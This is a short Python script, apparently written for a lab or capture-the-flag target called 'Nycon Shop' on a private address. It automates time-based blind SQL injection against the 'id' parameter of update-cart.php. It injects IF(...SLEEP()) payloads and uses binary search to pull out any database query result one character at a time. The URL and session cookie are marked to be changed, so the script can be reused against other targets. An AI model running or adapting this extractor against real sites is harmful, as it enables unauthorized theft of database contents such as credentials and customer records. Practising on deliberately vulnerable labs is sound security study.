#!/usr/bin/env python3
"""Time-based blind SQLi extractor for Nycon Shop"""

import requests
import time
import sys
import string

URL = "http://10.0.2.18/update-cart.php" #change this 
COOKIE = {"PHPSESSID": "atp6445etllp7f7lre2fvul5g7"} #change this
SLEEP_TIME = 5
THRESHOLD = 4  # seconds — if response > this, condition is TRUE
CHARSET = string.printable

def check(payload):
    """Send payload, return True if response is delayed"""
    params = {"action": "add", "id": payload}
    start = time.time()
    requests.get(URL, params=params, cookies=COOKIE, allow_redirects=False)
    elapsed = time.time() - start
    return elapsed > THRESHOLD

def extract(query, max_len=64):
    """Extract string from query using binary search"""
    result = ""
    for pos in range(1, max_len + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"1 AND IF(ORD(SUBSTRING(({query}),{pos},1))>{mid},SLEEP({SLEEP_TIME}),0)"
            if check(payload):
                low = mid + 1
            else:
                high = mid
        if low == 32:  # null byte = end of string
            break
        result += chr(low)
        print(f"\r[*] Extracting: {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    if len(sys.argv) > 1:
        query = " ".join(sys.argv[1:])
    else:
        query = "database()"

    print(f"[*] Query: {query}")
    print(f"[*] Target: {URL}")
    print(f"[*] Sleep: {SLEEP_TIME}s | Threshold: {THRESHOLD}s")
    print()
    result = extract(query)
    print(f"[+] Result: {result}")
